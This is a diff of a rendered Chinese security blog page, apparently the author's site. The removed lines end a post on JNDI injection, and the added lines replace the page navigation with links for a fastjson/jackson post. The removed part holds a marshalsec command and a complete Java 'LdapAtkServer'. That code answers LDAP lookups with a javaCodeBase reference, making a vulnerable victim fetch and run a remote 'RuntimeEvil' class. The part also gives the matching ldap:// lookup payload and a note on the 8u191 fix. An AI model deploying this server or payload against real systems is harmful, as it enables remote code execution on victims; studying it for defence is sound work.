-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-<span class="number">0.0</span><span class="number">.3</span>-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:<span class="comment">//127.0.0.1:8888/#RuntimeEvil 1099</span></span><br></pre></td></tr></table></figure>
-
-<p>也可以用java起，代码比较麻烦</p>
-<p>依赖：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.unboundid<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>unboundid-ldapsdk<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LdapAtkServer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=t4rrega,dc=domain&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( String[] tmp_args )</span> &#123;</span><br><span class="line">        String[] args=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;http://127.0.0.1:8888/#RuntimeEvil&quot;</span>&#125;;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">1099</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>, <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(args[ <span class="number">0</span> ])));</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="built_in">this</span>.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>记得要改协议，lookup payload：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldap:<span class="comment">//127.0.0.1:1099/#JNDI_RuntimeEvil</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>修复</li>
-</ul>
-<p>8u191 <code>com.sun.jndi.ldap.object.trustURLCodebase </code>属性的默认值被调整为false，LDAP也打不了了</p>
-<p>总之有JNDI，建议直接LDAP打，除非服务器禁了LDAP协议</p>
 
       </div>
       <div class="post-tags-categories">
         
         <div class="tags">
           
-            <a href="/tags/java%E5%8E%9F%E7%94%9FRCE/" class="">
-              java原生RCE
+            <a href="/tags/fastjson/" class="">
+              fastjson
             </a>
           
-            <a href="/tags/JNDI/" class="">
-              JNDI
+            <a href="/tags/jackson/" class="">
+              jackson
             </a>
           
         </div>
@@ -821,7 +672,7 @@
     </li>
     <li class="post-copyright-link">
     <strong>文章链接:  </strong>
-    <a href="/2024/09/25/jndi-zhu-ru/" target="_blank" title="JNDI注入(InitialContext.lookup)">https://godownio.github.io/2024/09/25/jndi-zhu-ru/</a>
+    <a href="/2024/10/25/fastjson-jackson-da-qu-fen/" target="_blank" title="fastjson jackson大区分">https://godownio.github.io/2024/10/25/fastjson-jackson-da-qu-fen/</a>
     </li>
     <li class="post-copyright-license">
       <strong>版权声明:   </strong>
@@ -843,18 +694,16 @@
   <div class="post-nav-prev post-nav-item">
     <div class="post-nav-img" style="background-size: cover; 
       background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8101.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8101.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+      <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8111.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8111.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
     </div>
-    <a href="/2024/09/26/rome-lian/" class="post-nav-link">
+    <a href="/2024/10/26/c3p0-lian/" class="post-nav-link">
       <div class="title">
         <i class="fas fa-angle-left"></i> 上一篇:
-        <div class="title-text">ROME链(ToStringBean&amp;EqualsBean)</div>
+        <div class="title-text">C3P0合集</div>
       </div>
       
       <!-- <div class="content">
-        ROME 是一个关于 RSS 和 Atom 格式的 java 框架
-那什么是 RSS 和 Atom 呢？
-RSS 全称：
+        C3P0是一个开源的JDBC连接池，它实现了数据源和JNDI绑定，目前使用它的开源项目有Hibernate，Spring
       </div> -->
     </a>
   </div>
@@ -865,18 +714,18 @@ RSS 全称：
   <div class="post-nav-next post-nav-item">
     <div class="post-nav-img" style="background-size: cover; 
       background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B899.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B899.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" src="" alt="">
+      <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8112.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8112.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" src="" alt="">
     </div>
-    <a href="/2024/09/23/loadclass-he-forname-jia-zai-shu-zu-lei/" class="post-nav-link">
+    <a href="/2024/10/24/fastjson-ref-diao-yong-getter/" class="post-nav-link">
       <div class="title">
         下一篇: <i class="fas fa-angle-right"></i>
-        <div class="title-text">loadClass和forName加载数组类</div>
+        <div class="title-text">fastjson $ref调用getter</div>
       </div>
       <!-- <div class="content">
-        在打shiro的时候，我们发现不能用Transformer数组，而能用byte[]数组，这是为甚？
+        之前有分析到，fastjson识别setter的流程如下：
+按以下顺序判断，满足条件的话，会被当成setter调用：
 
-原文：
-https
+
       </div> -->
     </a>
   </div>
@@ -1014,7 +863,7 @@ https
   <div class='content'>
     <div class="toc-main">
       <div class="toc-content">
-        <!-- <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#JNDI%E7%BB%91%E5%AE%9ARMI"><span class="toc-text">JNDI绑定RMI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RMIServer"><span class="toc-text">RMIServer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RMIClient"><span class="toc-text">RMIClient</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JNDIServer%EF%BC%88RMI%EF%BC%89"><span class="toc-text">JNDIServer（RMI）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JNDIClient%EF%BC%88RMI%EF%BC%89"><span class="toc-text">JNDIClient（RMI）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-text">源码分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%81%B6%E6%84%8FRMI-Server"><span class="toc-text">恶意RMI Server</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JNDI%E7%BB%91%E5%AE%9AReference"><span class="toc-text">JNDI绑定Reference</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%81%B6%E6%84%8F-Reference-Server"><span class="toc-text">恶意 Reference Server</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-1"><span class="toc-text">源码分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JNDI-other"><span class="toc-text">JNDI other</span></a></li></ol> -->
+        <!-- <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#setter"><span class="toc-text">setter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getter"><span class="toc-text">getter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95"><span class="toc-text">构造方法</span></a></li></ol> -->
         <div class="toc"></div>
       </div>
     </div>
